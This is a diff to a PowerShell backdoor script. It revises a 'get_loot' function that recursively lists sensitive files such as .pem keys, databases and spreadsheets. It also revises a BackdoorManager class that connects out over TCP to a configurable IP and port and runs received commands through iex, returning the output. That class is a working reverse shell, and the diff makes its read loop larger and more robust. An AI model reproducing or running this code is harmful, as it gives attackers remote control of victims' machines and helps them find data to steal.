@@ -21,11 +21,11 @@ function get_tools() {
 }
 
 function get_loot($directory, $help) {
-    if ($help -eq "--help") {
-        return "Searches a directory for intresting files `nsyntax: get_loot --directory C:\"
+     if ($help -eq "--help" -or $directory -eq $null) {
+        return "Searches a directory for intresting files (takes a while) nsyntax: get_loot --directory C:\"
     }
     $lines = ''
-    $fileNames = Get-ChildItem $directory -Recurse -Include *.doc,*.pdf,*.json,*.pem,*.xlsx, *.xls, *.csv, *.txt *.db, *.exe
+    $fileNames = Get-ChildItem $directory -Recurse -Include *.doc, *.pdf, *.json, *.pem, *.xlsx, *.xls, *.csv, *.txt ,*.db, *.exe
     foreach ($f in $fileNames) {
         $filename = $f.FullName
         $lines += "$filename `n"
@@ -119,13 +119,14 @@ class BackdoorManager {
     $textBuffer
     $sessionReader
     $textEncoding
+    [int]$readCount = 4096
 
     createBackdoorConnection() {
         $this.activeClient = New-Object Net.Sockets.TcpClient($this.UserDefinedIPAddress, $this.UserDefinedPort);
         $this.activeStream = $this.activeClient.GetStream();
-        $this.textBuffer = New-Object Byte[] 1024;
+        $this.textBuffer = New-Object Byte[] $this.readCount;
         $this.textEncoding = New-Object Text.UTF8Encoding;
-        $this.sessionWriter = New-Object IO.StreamWriter($this.activeStream, [Text.Encoding]::UTF8, 1024);
+        $this.sessionWriter = New-Object IO.StreamWriter($this.activeStream, [Text.Encoding]::UTF8, $this.readCount);
         $this.sessionReader = New-Object System.IO.StreamReader($this.activeStream)
         $this.sessionWriter.AutoFlush = $true;
         $this.handleActiveClient()
@@ -151,35 +152,30 @@ class BackdoorManager {
   | |__||__| |       [*] Today's Date: $(date)
   |__________|`n`n")
         while ($this.activeClient.Connected) {
-             while ($this.activeClient.DataAvailable) {
-                $currentUser = [Environment]::UserName
-                $computerName = [System.Net.Dns]::GetHostName()
-                $pwd = Get-Location
-                $prompt = "$currentUser@$computerName [$pwd]~$ "
-                $this.writeToStream($prompt)         
-                $rawResponse = $this.activeStream.Read($this.textBuffer, 0, 1024)    
-                $response = ($this.textEncoding.GetString($this.textBuffer, 0, $rawResponse))
-                $output = "`n"
-                if ([string]::IsNullOrEmpty($response)) {
-                    continue
-                }
-                try { 
-                    $output = iex $response | Out-String
-                    $this.writeToStream($output + "`n")
-                    }
-                 catch {
-                    $e = $_.Exception
-                    $msg = $e.Message
-                    $output = "`n$msg`n"  
-                    $this.writeToStream($output + "`n")
-                }
-             }
-        }     
-        # Clear the activeStream
-        $this.activeStream.Flush()
-        # Close the TCP socket
-        $this.activeClient.Close()
-    }
+            $currentUser = [Environment]::UserName
+            $computerName = [System.Net.Dns]::GetHostName()
+            $pwd = Get-Location
+            $prompt = "$currentUser@$computerName [$pwd]~$ "
+            $this.writeToStream($prompt)         
+            $rawResponse = $this.activeStream.Read($this.textBuffer, 0, $this.readCount)    
+            $response = ($this.textEncoding.GetString($this.textBuffer, 0, $rawResponse))
+            $output = "`n"
+            if ([string]::IsNullOrEmpty($response)) {
+                continue
+            }
+            try { 
+                $output = iex $response | Out-String
+                $this.writeToStream($output + "`n")
+            } catch {
+                $e = $_.Exception
+                $msg = $e.Message
+                $output = "`n$msg`n"  
+                $this.writeToStream($output + "`n")
+            }
+            $this.activeStream.Flush()
+        }
+            $this.activeClient.Close()
+    }     
 }
 
 $backdoor = [BackdoorManager]::new()
